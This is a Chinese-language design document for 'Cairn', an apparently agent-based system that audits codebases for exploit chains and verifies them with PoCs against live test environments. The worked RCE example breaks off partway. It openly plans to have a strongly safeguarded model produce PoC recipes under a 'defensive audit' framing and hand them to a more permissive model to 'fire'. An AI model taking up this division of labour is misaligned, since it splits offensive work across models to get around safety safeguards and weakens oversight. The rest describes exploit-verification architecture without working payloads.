# Code Audit —— Cairn 的代码审计形态

---

## 本质

代码审计与渗透测试共享同一个问题形状：**已知起点、已定终点、路径未知的状态空间搜索**。Cairn 的黑板架构（Fact / Intent / Hint + OODA + stigmergy）本身与领域无关，因此这份设计不重写引擎，而是重新定义引擎在代码审计场景下的语义。

改造遵循一条主线：**把渗透系统降维成一个子模块。** 代码审计图充当"目标生成器"，产出候选漏洞链；原有的渗透能力（拿着 URL 打一发）降维成"验证 worker"，对候选链做实证。两者是组合关系，不是替换关系。

三个语义锚点决定成败：

1. **Fact 是"能力/原语"，不是"漏洞"。** 一条 unauth RCE 链上，承重节点常常不是传统意义的漏洞（未认证入口、参数可控、路由在鉴权前注册），串起来才成立。按 CWE 打标签会丢掉这些承重的中间节点。
2. **没有本地执行环境，验证靠实况测试环境。** 目标代码不在本地跑；实际项目会提供测试环境。这让系统白捡了 execution-based 验证闭环，天花板从"plausible chain"顶到"proven chain"。
3. **围栏边界 = 交接线。** 强模型（高安全围栏）负责审计与产出 PoC 配方——框成防御性代码审计完全正当；许可度更高的模型负责实例化并开火。交接物是一份结构化 PoC Brief。

---

## 与现有 Cairn 的关系

| 现有原语 | 代码审计语义 |
|---|---|
| `origin` | 代码库路径（给静态 worker 读）+ 实况靶标 URL/凭证（给验证 worker 打） |
| `goal` | 能力谓词，如"未授权 RCE" |
| `Fact` | 能力/原语节点（**扩展**：加 `type` / `locations` / `evidence` / `code_version`；`confidence` 见下，是**派生视图而非可变字段**） |
| `Intent` | 待验证假设的探索边（**复用**；verify 任务的 Intent 额外挂 PoC Brief，见决策 #10） |
| `Hint` | 人类判断注入（**复用**：人工确认链路、提级 confidence 都走它） |
| `Reason` 任务 | 读图判断 goal 是否达成、缺口处提新 Intent（**复用**，判据升级） |
| `Bootstrap` 任务 | 枚举入口 + 信任边界 + 固化基座知识 |

引擎的 lease / heartbeat / conclude 双阶段机制复用，但调度**并非"基本不动"**：需新增一个 `verify` 任务相（capability-gated）和一条"验证结果 → 反向重新制导 Reason"的回边，`scheduler` 现有 `bootstrap / reason / explore` 三相要扩成四相。主要改动集中在：数据模型扩展、**conclude 契约（1 intent → N facts）**、prompt 语义、worker 能力路由、新增 `verify` 相与 `base_knowledge` 层。

---

## 设计要点

1. **知识分两层：持久基座 + 易变事实图。** 基座（架构、鉴权流程、路由模型、信任边界、框架约定）在首扫时固化，稳定、compact、每个 worker 廉价只读；事实图目标制导、增删频繁、只保留与当前 goal 相关的节点。这样解决了"Reason 读全图上下文爆炸"，用**分离稳定基座与易变工作集**实现 MopMonk 所说的"降低长上下文负担"。

2. **基座必须可被 fact 打补丁，不能冻结。** 漏洞常藏在"对鉴权流程的误解"里（基座写"有全局鉴权中间件"，而漏洞恰是"某路由绕过了它"）。worker 发现与基座冲突的证据时，要去修正基座（`revised_by` 指针 + `version` 递增），而不是留个孤儿 fact。冻死的基座会成为整个系统继承的盲区。

3. **用实况环境早期接地基座，而非只在末尾验 PoC。** `kind: auth` 的基座条目应尽早推到 `live-confirmed`（如"不带 token 打这条路由，真的 401 吗"）。早期接地比等到深挖后才发现基座错误便宜得多。

4. **Fact 的 `type` 与 `confidence` 正交，且 `confidence` 是派生视图不是可变字段。** `type` 说"是什么"（source/sink/dataflow/constraint/gadget/reachability），`confidence` 说"多确定"（hypothesized → static-confirmed → reachable-confirmed → poc-confirmed / refuted）。关键约束：**没有任何节点的 confidence 会被就地改写**——审计 worker 建的静态节点 confidence 写死在创建时；验证 worker 不回改它，而是**追加一个新 fact**（`type: verification`，档位为 `reachable-confirmed` / `poc-confirmed` / `refuted`）经 `verifies` 边指向被验证节点。一个"漏洞"节点的**有效 confidence 是 server 对指向它的验证 fact 折叠出的视图**，见「模型-存储分层」与决策 #6。这样 append-only 协议零破坏（`server-protocol.md`：Fact 只增不改、永久保留、无状态标记）。

5. **负向证据一等公民化。** `type: constraint` 的 fact（鉴权/过滤/WAF/不可达）既防止多 worker 重复撞死路，又在链路里充当"必须绕过的承重节点"。实况确认的负向证据（被 WAF 拦、参数运行时被 sanitize）强度远超静态推断，优先级甚至高于正向 fact 去重。

6. **Fact 去重靠 `locations` 做 canonical key：`type + sorted(locations)`。** free-text 描述无法去重；多 worker 必然重复发现同一 sink，需要规范化合并键。合并时 `locations` **取并集**（一次报 1 行、一次报 3 行不应拆成两个 fact），描述冲突时**保留先写**（或把后写差异记为 hint）。例外：`type: verification` 不用 `locations` 键；实况 `constraint` 常无稳定 `file:line`，允许 `locations: []`，键退化为 `verifies 目标 + why_failed.reason`。

7. **两阶段流程：测绘（广度）→ 目标制导深挖（深度）。** 首扫只做攻击面测绘 + 固化基座，**不做完整利用**；给定 goal 后 Reason 串已知 fact，只在链路缺口处深挖。盲目全量穷举在中大型库上开销无上界，且丢掉了这套架构最强的目标制导剪枝。注意"不做 eager 全量 inventory"不等于"不持久化"——已确认的 fact 要跨 run 惰性累积复用，见下面「知识持久化与跨 run 复用」一节。

8. **worker 引入 capability 维度做路由。** 静态 worker 只有本地 FS 只读权限；验证 worker 有测试环境网络可达 + 凭证 + 浏览器/HTTP 工具。这不是"预定义角色"，是能力/凭证区别，`scheduler/worker_select.py` 需据此路由 verify 任务（`capabilities` 字段见决策 #10）。

9. **PoC Brief 是审计→验证的交接契约，必须自足。** 交接物若很薄，验证 worker 会把强模型的分析全部重做，浪费强模型。Brief 至少含：链路（承重 fact 序列）、如何触达 source（端点+方法+前置态）、source→sink 数据路径、payload 配方、**成功判据（oracle）**。

10. **oracle 不能省，且由审计 worker co-design。** 200 响应 ≠ 成功；RCE 需带外信号（回连/时延盲测/可读回文件/DNS OOB）。审计 worker 读了 sink 代码，最有资格定义"成功长什么样"，因此 oracle 在交接时就写进 Brief，而非让验证 worker 现场瞎猜。

11. **验证 worker 是带记忆的 PoC 迭代循环，不是布尔预言机。** 代码路径知识在审计端、运行时反馈在验证端，两者来回交互才能收敛出可触发的 PoC。验证 worker 读 code-path fact → 试一发 → 把"为什么没触发"写回 → 据此调 payload。这正是 MopMonk 的 candidate-PoC / input-format / verification-state 记忆循环所在。

12. **开火工具按链路选传输层，不硬编码浏览器。** 原始 HTTP 客户端（curl/httpx）覆盖绝大多数 API 级利用；浏览器（chrome MCP）用于需要真实 session/JS 渲染鉴权/多步业务/**现场解析真实路由**的场景；抓包代理用于捕获真实请求再改。浏览器表达不了畸形 content-type / 原始字节 payload，不能当默认开火器。

13. **发包由 worker 编写 Python 脚本、跑在固定 harness 上。** harness 固化基建（强制走代理便于人工审流量、伪造 header、session/auth 装配、base URL），只暴露"利用 payload 逻辑"一个变量槽。代理同时是捕获/回放 + oracle 观测点（标准化"基线请求 + payload 请求 + diff"）。harness 消费 Brief 的成功特征，返回结构化 pass/fail。

14. **Complete 判据升级为 confidence 分级。** 因为够得着 `poc-confirmed`，goal 完成不再是"一条看起来通顺的静态链"，而要求链路末端关键 sink 达到 `poc-confirmed`（或人工在 Hint 里确认）。这是"plausible chain"与"proven chain"的分水岭。`reason.md` 的"is goal met"判据据此重写。

15. **人工介入即 human-in-the-loop，复用 `Hint`，且与代理审流量合流。** "人审攻击流量"这个动作本身就是"人工确认链路有效"的闸门。一个代理面板同时满足合规审计与人工确认。`poc-confirmed` verification fact 既可由验证 worker 追加、也可由人注入 Hint 触发追加——**同一 fact 类型换写入者**，因此 v1 人工确认、v2 验证 worker 自动写，schema 不返工。

16. **验证结果必须结构化回写图。** 成功 → `poc-confirmed` fact，把能打通的 PoC 当 evidence 存；失败 → 带 `why_failed` 的实况负向 constraint fact，反向重新制导审计 worker；浏览器现场观察到的真实路由回补 `routing_map`。

17. **同一代码库多次挖掘，fact 跨 run 惰性持久累积、不重挖。** 同一代码库会针对不同 goal 跑多次（第一次未授权 RCE，之后可能是越权读数据等）；一次 run 确认的能力节点（如"身份伪造→提权 admin"）对后续 goal 常可直接复用组合。因此确认过的 fact 沉淀进持久层，图沿真正走过的路径累积，而非每个 goal 从零重挖——重挖浪费的恰是最贵的强模型静态分析 + 实况验证，且负向证据的复用价值最高（不再撞已证死路）。详见「知识持久化与跨 run 复用」。

---

## 数据契约

### 1. 基座知识（Base Knowledge）—— 活文档，非图节点

一次扫描固化，可被 fact 打补丁；每个 worker 只读、不重算。

```yaml
base_knowledge:
  version: int                    # 每次被 patch 递增，worker 读时判断新旧
  entries:
    - id: bk001
      kind: architecture | auth | routing | trust_boundary | convention
      statement: str              # 一句话结论，如"鉴权由 @login_required 装饰器逐路由施加"
      evidence: [file:line]       # 支撑结论的代码位置
      confidence: assumed | code-confirmed | live-confirmed
                                  # live-confirmed = 拿测试环境接地过
      revised_by: fact_id | null  # 被哪个 fact 推翻/修正过（可打补丁的关键）
  routing_map:                    # 源码路由 ↔ 实况路径，验证 worker 强依赖
    - src: "src/api/import.py:42"
      live: "POST /api/import"
      via: direct | gateway_rewrite | spa_route
      confidence: assumed | live-confirmed
```

`assumed` = 静态猜测；`live-confirmed` = 测试环境验证过。`kind: auth` 的条目应尽早推到 `live-confirmed`。

**基座是协议外的第二存储，不是图节点**——它允许 `version++` + `revised_by` **就地改**（与 Fact 的 append-only 不同），因此要显式约束，否则"活文档"会变成静默漂移：

1. **patch 必须由冲突 fact 触发并留审计。** 任何 `revised_by` 都记录（谁、因哪条 fact、何时），不允许无来源的静默改写。
2. **worker 读基座带 `version`；执行中 version 变了要在 conclude 前重拉。** 避免基于旧鉴权/路由模型写出的 PoC Brief 落库（例：worker 手里是"有全局鉴权"的旧基座，期间已被 patch 成"某路由绕过"，据此产出的结论已失效）。

### 2. Fact —— 扩展 `server/models.py::Fact`

```yaml
fact:
  id: str
  type: source | sink | dataflow | constraint | gadget | reachability | verification
        # v1 先用 source/sink/dataflow/constraint + verification 五类；gadget/reachability later
  description: str                # 保留，人读
  confidence: hypothesized | static-confirmed | reachable-confirmed | poc-confirmed | refuted
                                  # 写死在创建时，永不就地改写；升级/证伪靠追加 verification fact
  verifies: fact_id | null        # 仅 type=verification：本 fact 验证/证伪的目标节点（append-only 的边）
  intent_id: str                  # 机器盖章：产出本 fact 的 Intent；决策 #7 用它给 N-1 附属 fact 归属
  batch_id: str                   # 机器盖章：同一次 conclude 写入的 N facts 共享，模型不填
  locations: [file:line]          # canonical key = type + sorted(locations)，合并取并集
                                  # 例外：type=verification 不用此键；constraint 允许 []（键退化见设计要点 6）
  code_version: str               # 确认时绑定的代码版本（commit hash 或 locations 内容 hash）
                                  # 跨 run 复用时若底层代码已变 → 折叠视图把该节点降为待重验（防腐），
                                  # 不改任何存储字段，只是失配的 verification fact 不再计入有效 confidence
  preconditions: [fact_id]        # later：用此 fact 需先满足的条件（如"需绕过 c003"）
  evidence: str                   # v1 先 str（taint path / snippet / poc_ref）
```

**type 语义**：`source` 未受信输入入口；`sink` 危险操作；`dataflow` 一条已确认的 source→sink 路径（链路的一环）；`constraint` 负向证据/障碍（鉴权/过滤/WAF/不可达），是链路必须绕过的承重节点。

**confidence 阶梯（写入者）**：

| 级别 | 含义 | 写入者 |
|---|---|---|
| `hypothesized` | 静态怀疑，没坐实 | 审计 worker |
| `static-confirmed` | 代码层确认路径存在 | 审计 worker |
| `reachable-confirmed` | 实况可触达（含鉴权前置） | 验证 worker / 早期接地 |
| `poc-confirmed` | 实况打通，有 PoC | 验证 worker / **人工 Hint** |
| `refuted` | 实况证伪 | 验证 worker |

**append-only 语义**：`hypothesized` / `static-confirmed` 是节点被创建时的自身档位；`reachable-confirmed` / `poc-confirmed` / `refuted` **不写回原节点**，而是各自作为一个 `type: verification` 的新 fact（`verifies` 指向目标）追加进图。某节点的**有效 confidence** 由 server 折叠得出（取指向它的 verification fact 中最高合法档；出现 `refuted` 或 `code_version` 失配则降为待重验）。这样"confidence 阶梯"完全落在 Cairn"只增不改"的原生表达上——等同协议里 `f003 root shell → f007 内网发现` 的追加式状态演进，且**天然产出一条完整验证审计轨**（正好满足合规章节的流量留档要求）。

**有效 confidence 折叠规则（server 拥有，Reason / UI 只读结果）**：

- **多条 verification 指向同一节点** → 取**最新的未过期**那条的档位（不是"历史最高"）。这样"先 poc-confirmed、后因回归 refuted"与"先 refuted、后重试 poc-confirmed"都由时间序自然处理，无需 refuted 一票否决——**否决会把后来的合法成功也挡掉**，故不采用。
- **过期判定** → verification fact 的 `code_version` 与目标节点当前 `code_version` 失配即视为过期，不计入折叠。
- **无有效 verification** → 回落到节点创建时的自身档位（`hypothesized` / `static-confirmed`），但**必须显式标记 `stale`**（曾验证过、现已过期），绝不 silently 当作从没验证过。`stale` 是**折叠视图字段、不落库**——存储层只有 append-only 的 fact，stale 由折叠时现算。
- **人工 Hint 确认** → server 按约定格式把 Hint 代写成一条 verification fact（`verifies` + 档位 + evidence 指向 Hint），**人不直接改 confidence**；v1 人工、v2 验证 worker，写入路径统一。

**两类边的区分（`verifies` ≠ Intent 边）**：图从此有两类边——Intent 边表达"探索因果"，`verifies` 边表达"实证关系"。因此：

- 折叠视图把 verification fact **挂到被验证节点上展示**（UI / export 都以节点为中心聚合它的 verification）。
- `relevant_subgraph` 的反向可达**只沿 `dataflow` / `constraint` 边走**，但返回前**按有效 confidence 过滤**：末端 sink 若有效 confidence 已是 `refuted`（且未被更新的成功覆盖），该路径不进切片，**避免 Reason 对已证伪 sink 反复提 verify 任务**。

### 3. PoC Brief —— 审计→验证交接契约

挂在 verify 任务的 Intent 上作为结构化 payload（Intent 通用，任务类型为 `verify`，见决策 #10）。围栏边界：强模型产出到此为止。

```yaml
poc_brief:
  chain: [fact_id]                # source→sink 有序承重节点，含要绕过的 constraint
  entry:
    endpoint: str                 # 如 "POST /api/import"（可引用 routing_map）
    precondition: none | session | role:<name>
  dataflow: str                   # 参数→经过哪些函数→sink，带 file:line
  payload_recipe:
    gadget: str | null            # 如 "yaml.load 反序列化"
    shape: str                    # payload 要达成什么 + 约束（长度/字符集/须避开哪个过滤）
  success_signature:              # oracle —— 最硬、不能省
    kind: oob_callback | timing | response_match | side_effect
    check: str                    # 回连 token / sleep 阈值 / 响应正则 / 可读回的文件
  constraints_to_bypass: [fact_id]  # later：已知拦截点及其已知信息
```

### 4. Harness 返回契约 —— 验证脚本统一输出

回写为 `ConcludeRequest`：成功→追加 `type: verification` 的 `poc-confirmed` fact（`verifies` 指向末端 sink）；失败→追加 `refuted` verification fact + 带 `why_failed` 的新 `constraint` fact。**均为追加，不改被验证节点。** 实况 `constraint` 常无稳定 `file:line`，允许 `locations: []`，去重键退化为 `verifies 目标 + why_failed.reason`（见设计要点 6）。

```yaml
harness_result:
  triggered: bool                 # 判决
  evidence: str                   # 凭什么算成功（收到回连 / 时延差 / 命中特征）
  request: str | [str]            # 实际发出的报文（代理已留档，供人审）
  response: str                   # 相关响应片段
  why_failed:                     # 没触发时——直接变负向 fact
    reason: unreachable_route | auth_blocked | waf_blocked | sanitized | no_signal | error
    detail: str
  observed_routing: str | null    # later：现场观察到的真实路径/会话 → 回补 routing_map
```

---

## 模型-存储分层（窄腰）

一条贯穿性原则，同时解掉"Reason 上下文膨胀"和"schema 复杂度过早暴露给模型"两个风险：

> **模型只在一个"窄腰"上工作——进来是 server 预检索好的最小相关子图，出去是最小 emit schema；完整结构、检索、规范化、状态转移全部由 server/dispatcher 拥有。**

上面「数据契约」那套丰富 schema 是**存储/查询 schema**，不是模型直接面对的东西。模型永远看不到完整 schema。

### 输入侧：goal → 相关子图（反向可达查询）

跨 run fact 库增长后，Reason 不能吃全量 YAML。但 goal → 相关子图**不需要语义/向量搜索**，图本身有廉价的结构句柄——这是一个**从 goal 相关 sink 出发的反向可达查询**：

1. goal（"unauth RCE"）映射到**终态 sink 类型**（RCE = exec / deserialize / SSTI / template）。v1 用一张小映射表 + sink `description` 关键词兜底，不上语义模型。
2. 从匹配这些类型的 sink fact 出发，**沿 Intent provenance（`from[]→to`）反向走 N 跳**到 source——"边"的定义见决策 #12：`type` 只是节点标签，遍历走的是 Intent 图。
3. 路径上的连通子图（**必须带上途中的负向 `constraint`、并按有效 confidence 过滤掉已 `refuted` 的路径**，否则 Reason 会反复提"绕过已证不可绕的东西"或对已证伪 sink 重复开验），再附上同 `batch_id` 的附属 fact，即喂给 Reason 的切片。

纯结构遍历、确定性、无需嵌入。只有当结构遍历返回的候选也多到爆时，才加排序层（embed / LLM rank）——那是 v2。

**接缝先定、实现后填**：v1 就让 Reason 从 `relevant_subgraph(goal)` 这个 server 接口取数，接口实现可以先"返回全部"。单 goal、中小库时 fact 才几十个，全量够用；库涨起来换实现，不动 prompt，也不上向量库。

### 输出侧：emit schema ≠ 存储 schema

模型擅长判断/抽取，不擅长维护结构不变量——**它填的每个字段都是它能填坏的字段**。所有字段按谁写分三类：

| 字段类 | 例子 | 谁写 |
|---|---|---|
| **模型产出**（判断/抽取） | `type` / `description` / `locations` / payload `shape` / oracle 想法 | 模型 |
| **机器盖章** | `id` / `code_version` / `version` / 时间戳 | dispatcher/server |
| **状态转移门控** | `confidence` 高档位、`live-confirmed` | 只有特定写入者/事件能设 |

模型只吐一坨扁平、少字段的"观察"（emit schema），server 把它转成富 fact（补 `id` / `code_version`、按 `file:line+type` 去重合并、门控 `confidence`）。**复杂度全留在 server 侧。**

两个最要紧的门控：

1. **`confidence` 绝不让模型自由填，且高档位不写回原节点。** 审计模型**最高只能声明到 `static-confirmed`**（作为它新建节点的自身档位）；`reachable-confirmed` / `poc-confirmed` / `refuted` **只能作为新的 `type: verification` fact 由验证路径 / harness 追加**，server 折叠成有效 confidence 视图。confidence 是个**按写入者门控、追加式演进的状态机**，既不是自由文本，也不是可就地改写的字段。
2. **`code_version` 模型不该猜、`chain: [fact_id]` 的 ID 引用由 server 校验。** `code_version` 由 dispatcher 在拿到 `locations` 后现场哈希盖章；ID 引用是模型最易翻车处，存在性/连通性由 server 校验或修复。

### v1 取舍

server 侧先做**便宜又高价值**的：去重、`id` 分配、`code_version` 盖章、`confidence` 门控。推后**贵的**：向量检索、`preconditions` / `chain`-ID 自动修复。

---

## 关键设计决策（已拍板）

1. **`dataflow` 是 fact 而非 Intent。** 一条确认的 source→sink 路径 = 一个可被引用进 `chain` 的节点；Intent 保持"待验证的探索边"语义。代价是 fact 与 intent 边界略微模糊，换取路径的可引用性。

2. **`constraint`（负向 fact）进入 `chain`。** "要绕过 auth"必须在 Brief 里显式承重，因此 chain 是"正向节点 + 待绕过障碍"的混合序列，而非纯正向能力序列。

3. **知识累积策略三选一：惰性持久累积（选中）。** 三个正交选项——① eager 全量 inventory（首扫穷举 source/sink）：否，开销无上界；② per-run 从零重挖：否，浪费最贵的强模型 + 实况验证；③ **惰性持久累积**：选中——不预先穷举，但凡目标制导 run 确认的 fact 都沉淀进持久层，图沿真正走过的路径跨 run 累积复用。代价是必须处理防腐、跨 run 去重、按 goal 检索三件事，见「知识持久化与跨 run 复用」。

4. **Reason 不吃全量图，走 `relevant_subgraph(goal)` 接口（采纳同事意见）。** goal→子图用反向可达查询而非向量检索；v1 接口先定、实现先返回全部，库涨起来再换。见「模型-存储分层 / 输入侧」。

5. **模型只面对最小 emit schema，富 schema 留在 server（采纳同事意见）。** 字段分模型产出 / 机器盖章 / 状态转移门控三类；`confidence` 高档位与 `code_version` 不让模型自由填。见「模型-存储分层 / 输出侧」。

6. **`confidence` 是派生视图，验证结果一律追加新 fact、绝不改写原节点（新拍板）。** 审计 worker 建的静态节点 confidence 写死在创建时；`reachable-confirmed` / `poc-confirmed` / `refuted` 各自是一个 `type: verification` 的新 fact（`verifies` 指向目标），server 折叠出节点有效 confidence。此举让"实证 confidence 阶梯"完全落在协议的 append-only 语义上（`server-protocol.md`：Fact 只增不改、无状态标记），**无需为领域开"机器盖章字段可 update"的例外**；同时白捡一条完整验证审计轨，正好服务合规章节的流量留档。防腐（`code_version` 失配）走折叠视图降级，不改任何存储字段。见「模型-存储分层」。

7. **conclude 契约扩展为 1 intent → N facts（新拍板）。** 现契约是 1 intent → 1 fact（`ConcludeResponse` = 单 fact + 单 intent）；但决策 #1（dataflow 独立可引用）、#3（单节点跨 run 复用）、以及 `file:line + type` 的 per-node 去重键都要求一次 explore 能落多个节点（source + dataflow + constraint）。"把整条候选链压进一个 fact description"会同时废掉这三者，**与已拍板决策自相矛盾，故排除**——它不是一个开放的等权选项。落地方式：explore emit N 个扁平 observation，conclude 侧写 N 个 fact。Intent 的 `to` 仍是**单个** fact id（不破协议）：conclude 写 N facts 后，`to` 指向**主 fact**（规则写死：`verify` → 该 verification fact；`explore` → 优先 `dataflow`，否则第一个 `sink` / `source`）；其余 N-1 条 fact 各自带**发起它的 `intent_id`（或 `batch_id`）**做归属，而非把"同批"语义硬塞进 `from`。这样 UI / export / `complete.from` 都无歧义，单指针协议零改动。

8. **验证路径是独立 container profile，边界由 harness / 调度层强制，非模型自觉（新拍板）。** 现状一 project 一容器（单 image / 单 network_mode / 单 cap_add）。验证 worker 需要网络可达 + 凭证 + 代理 + 可能浏览器，与只读 FS 的静态 worker **不能共宿**——否则网络隔离、allowlist、kill-switch 都做不实。因此验证跑在独立 profile（不同 image / cap / network），所有出站强制过本地 harness 代理。此项与合规章节（靶标白名单、强制审计轨、kill-switch）是同一件事，**必须一起设计、不能后补**。

9. **`origin` v1 就定为结构化 JSON（新拍板）。** 不必立刻拆 Codebase / Goal-Run 表，但 `origin` 从自由文本升为可解析 JSON，否则决策 #8 的 harness allowlist 与 `code_version` 盖章都悬空：

    ```json
    {
      "codebase":  {"path": "...", "commit": "a1b2c3d"},
      "target":    {"base_url": "https://...", "credentials_ref": "secret:xxx"},
      "allowlist": ["host:port", "oob.example"]
    }
    ```

    `credentials_ref` 是**引用不是明文**（凭证走 secret 存储）；`allowlist` 直接喂 harness 出站围栏。Codebase / Goal-Run 是否拆表仍是开放问题，但 origin 结构化不再等它。

10. **`verify` 是真·第四任务类型，不是打了标记的 explore（新拍板）。** 现 `TaskType = reason | explore | bootstrap`，`TasksConfig` 亦然。verify 的超时、container profile、emit schema 都与 explore 不同（见决策 #8、#11），塞进 explore 靠标记区分会把两套 gating 混进一个状态机。因此：新增 `TaskType: verify`；Intent 结构保持通用（用 `description` / PoC Brief payload 区分业务语义）；`WorkerConfig.task_types` 可含 `verify`，并新增 `capabilities: [static_fs | live_http | browser]` 字段，`worker_select` 据此路由（现只看 priority / running）。这坐实"调度非基本不动"。

11. **验证的多轮迭代发生在单个 verify 任务内，只结构化回写一次（新拍板）。** 现引擎是"claim → 跑一阵 → conclude 一条"的单次模型；验证要"试一发 → 看 why_failed → 调 payload"多轮。三种做法里：每发一次就 conclude（图爆炸）否；每次失败只写 constraint 让 Reason 再开 verify 任务（intent 抖动、丢迭代上下文）否；**选任务内迭代**——verify session 内多轮试打，中间过程进 `evidence` / 日志**不进 fact 洪水**，最后一次才结构化 conclude（成功 verification fact / 失败 refuted + constraint）。据此 `tasks.verify.timeout` 应明显长于 `explore`。

12. **`relevant_subgraph` 的"边"= Intent provenance 图，`type` 只是节点标签（新拍板）。** 当前图只有 Intent 边（`from[] → to`），`dataflow` / `constraint` 是 Fact 类型不是边。三选一中：B（给 fact 加显式 `links[]`）平白多一类边、C（`locations` 重叠做弱边）不稳，均否；**选 A**——结构边复用 Intent provenance：从 goal 相关 sink 沿 `from[] → to` **反向 N 跳**得"主 fact 脊柱"，再按 `batch_id` 附上同批 fact（`source` / `constraint` 本身不是任何 Intent 的 `to`，只能靠批次挂靠）。goal→sink 类型 v1 用小映射表 + `description` 关键词兜底。不选 A/B/C，`relevant_subgraph` 只能永远"返回全部"。

13. **PoC Brief 由 server / dispatcher 组装，Reason 只吐粗 verify 意图（新拍板）。** Reason 今天只吐 `complete` / `intents[{from, description}]`，撑不起富 Brief。最窄腰做法：Reason 只判断"链 X 已齐、该验了"并吐 `{from: chain_fact_ids, description}` 的粗 Intent；server 校验 chain 存在性/连通性后，用**已落的 fact + 模板**拼 Brief（`entry.endpoint` 取 `routing_map`，`dataflow` 拼 chain 各 fact 的 `locations`，`oracle` 由 explore 阶段让审计 worker 多吐的"oracle 草稿"提供，缺则回退模板）。模型不手填 Brief 富结构，符合"emit schema ≠ 存储 schema"。

14. **一 project 同时挂 static + verify 两个 container profile，verify 短生命周期（新拍板）。** 现"一 project 一 container"扩为"一 project 一组 profile"：`static`（只读 FS、无网络）与 `verify`（网络 + 凭证 + 代理）**并存**；codebase volume **只读**挂给两边，测试环境凭证 / 出站网络**只注入 verify profile**。verify 容器**每个 verify 任务结束即 remove**（bound 凭证 / 网络暴露面，配合 kill-switch），static 容器沿用现有 `completed_action`。`ContainerManager` 与 `container` 配置需从单 profile 扩为按 task 能力选 profile（与决策 #8、#10 同一件事）。

---

## 知识持久化与跨 run 复用

同一代码库会针对不同 goal 反复挖掘。一次 run 确认的能力节点常可被后续 goal 直接组合复用（例：run 1 挖 unauth RCE 时确认的「身份伪造→提权 admin」子链，run 2 的"越权读数据"可直接复用）。因此知识按**耐久度分三层**，只惰性累积、不 eager 穷举、不 per-run 重挖。

| 层 | 内容 | 跨 run 复用性 | 归属 |
|---|---|---|---|
| **基座知识** | 架构 / 鉴权 / `routing_map` / 信任边界 | 完全 goal 无关，天然持久 | Codebase |
| **Fact 库** | 累积的 source/sink/dataflow/constraint/gadget 节点 | 高（需防腐） | Codebase |
| **Per-run 目标链** | 某 goal 的 Intent / chain / PoC Brief；打通的链归档成"已知利用"宏 | goal 专属 | Goal-Run |

Fact 库是**惰性累积**（随每个 goal 一点点填），不是首扫一次性铺满的 inventory。

### 持久化强制处理的三件事

1. **防腐——fact 绑代码版本。** `poc-confirmed` 是针对确认时的代码/环境态成立的。两次 run 之间代码若变，该 fact 可能失效。fact 绑 `code_version`（commit hash / 相关 file 内容 hash）；复用时若底层代码已变，**自动把 confidence 降级为待重验**，不盲信。缺此则持久库腐烂、后续 run 建在假信心上。
2. **跨 run 去重升级为硬需求。** 后续 run 必须认出前面 run 建的 fact、不重复建。`file:line + type` 的 canonical key 从"nice to have"变成"必须有"。
3. **Reason 按 goal 检索子图。** 图跨 run 只增不减，goal #2 的 Reason 绝不能读 goal #1 的整张图，必须按当前 goal 检索相关子图。**持久化与检索机制绑定**：要前者就得做后者。具体查询策略（反向可达）与接缝见「模型-存储分层 / 输入侧」。

### 开放问题：Project 模型是否要拆（留待与同事讨论）

现有 Cairn `Project` 把 `origin + goal + facts` 捆在一起。要支持"同一代码库多 goal 复用"，终态应拆成两层：

- **Codebase**（持久）：基座知识 + Fact 库，绑代码版本
- **Goal-Run**（易变）：一次针对某 goal 的探索，是 Codebase 之上的一个视图/子图，引用共享 Fact 库

这就是 MopMonk 的 shared memory 从"任务内并行 agent 共享"推广到"跨 goal 串行 run 共享"。

**v1 务实版**可先不大改 Project：一个 codebase 一个持久 fact 存储，按 `file:line + code_version` 存，goal 用 tag/filter 表达，先把"累积 + 防腐降级 + 按 goal 过滤"跑通；多 goal 场景真吃紧后再正式拆 Codebase / Goal-Run。`origin` 结构化已在**决策 #9 拍板**（v1 定为 JSON），跨 run 去重、`code_version` 绑定、验证 allowlist 均以此为锚。**仍开放**的只是 Codebase / Goal-Run 是否正式拆表——此项牵扯数据模型，多 goal 场景真吃紧后再与同事拍板。

---

## 工作流程

```
用户指定：代码库路径 + 测试环境 URL/凭证 + goal（如"未授权 RCE"）
        │
        ▼
[Bootstrap] 静态 worker 扫码 → 固化基座知识（架构/鉴权/路由/信任边界）
        │                        ↕ 可选：用测试环境早期接地 auth 模型
        ▼
[Reason]  读 goal + 基座 + 现有 fact → 判断 goal 是否达成
        │       ├─ 达成（末端 sink poc-confirmed）→ Complete
        │       └─ 未达成 → 在链路缺口处提 Intent
        ▼
[Explore] 静态 worker 认领 Intent → 挖 source/sink/dataflow/constraint fact
        │                              （hypothesized / static-confirmed）
        ▼
[Reason]  组装出完整候选链 → 产出 PoC Brief → 派发 verify 任务（Intent 挂 Brief）
        │
        ▼
[Verify]  verify 任务（能力路由）读链路代码 → 写 Python 脚本跑 harness
        │   ├─ 任务内多轮迭代：试一发 → 看 why_failed → 调 payload（中间过程进日志/evidence，不进 fact）
        │   ├─ 走代理（人审流量 = human-in-the-loop 闸门）
        │   ├─ 按链路选 HTTP/浏览器/代理传输层
        │   └─ 按 success_signature 判 oracle
        ▼
      末轮结构化回写（append-only，不改被验证节点）：
            成功→追加 poc-confirmed verification fact + PoC evidence
            失败→追加 refuted verification fact + 带 why_failed 的 constraint fact（反向制导）
            观察到的真实路由→回补 routing_map
        │
        ▼
      循环直到 goal 的末端 sink 达到 poc-confirmed（或人工 Hint 确认）
```

---

## Worked Example：一条 unauth RCE 链

用一个填满真实内容的实例把上面的抽象 schema 具象化。目标应用是一个 Flask 风格的 Python 服务，`goal = 未授权 RCE`。

**基座知识（首扫固化）**

```yaml
base_knowledge:
  version: 3
  entries:
    - id: bk007
      kind: auth
      statement: "全局鉴权由 @login_required 装饰器逐路由施加，未装饰的路由无鉴权"
      evidence: ["app/auth.py:22", "app/api/user.py:15"]
      confidence: live-confirmed        # 已用测试环境接地：带/不带 token 打受保护路由验证过
      revised_by: f-c001                # 被 c001 修正（发现一条未装饰的路由）
  routing_map:
    - src: "app/api/import_bp.py:31"
      live: "POST /api/import"
      via: direct
      confidence: live-confirmed
```

**Fact 链（承重节点，正向 + 负向混合）**

```yaml
- id: f-s001
  type: source
  description: "/api/import 接受未认证 multipart 上传，字段 config 可控"
  confidence: static-confirmed
  locations: ["app/api/import_bp.py:31", "app/api/import_bp.py:38"]
  code_version: "a1b2c3d"

- id: f-c001
  type: constraint          # 负向但承重：它证明"无需鉴权即可触达 source"
  description: "import_bp 蓝图未加 @login_required，且在全局鉴权中间件之前注册 → 绕过鉴权"
  confidence: static-confirmed      # 静态节点创建时最高只能到 static-confirmed（见决策 #6）
  locations: ["app/api/import_bp.py:31", "app/__init__.py:44"]
  code_version: "a1b2c3d"

